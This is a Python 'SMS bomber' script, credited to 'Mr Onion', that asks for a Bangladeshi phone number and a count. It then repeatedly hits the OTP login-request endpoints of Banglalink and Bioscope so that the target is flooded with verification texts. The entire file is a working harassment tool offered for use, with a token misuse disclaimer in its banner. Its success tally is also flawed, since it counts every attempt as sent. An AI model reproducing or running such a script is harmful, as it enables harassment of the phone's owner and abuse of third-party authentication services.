print(f"###############  ##########")
print(f"###############  ########## ")
print(f"      ###        ##")
print(f"      ###        ##   ")
print(f"      ###        ##########")
print(f"      ###        ##########")
print(f"      ###                ## ")
print(f"      ###                ##")
print(f"      ###       ###########")
print(f"      ###       ###########")
print(f" ")
print(f" ")
print(f"Don't missuse this tool")
print(f"If you do it will be your own responsibilty")
print("")
print(f"Author:Mr Onion ")
print("")
print(f"Contact FB:https://www.facebook.com/mr.x3n0n/ ")
print("")
print("website:www.mronion420.000webhostapp.com")
print("")
print("")
print("Git Hub:")
print("_______________________________________________")
print(f" ")
import requests as rq
import time
number  = str(input("[>] GIVE THE BD Number TO MR ONION: "))
amount = int(input("[>] Enter The Ammount: "))

sent, nsent = 0, 0

for count in range(1, amount + 1):
  try:
    status = 0
    if number.startswith("014") or number.startswith("019"):
      r = rq.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": number})
      status = r.status_code
        
    else:
      url = f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{number}&operator=bd-otp"
      r = rq.get(url)
      status = r.status_code
    
    if status == 200:
      print(f"[✓] {count} SMS Sent.")
    time.sleep(1)
    sent += 1
    count += 1

  except:
      print(f"[×] {count} SMS Not Sent.")
      time.sleep(10)
      count+=1

  count += 1   
  
            
            
totalhit  = amount
nsent     = totalhit - sent

print(f"[•]  Hits : {totalhit}")
print(f"[✓] Total Sent : {sent}")
print(f"[×] Total Not Sent : {nsent}")
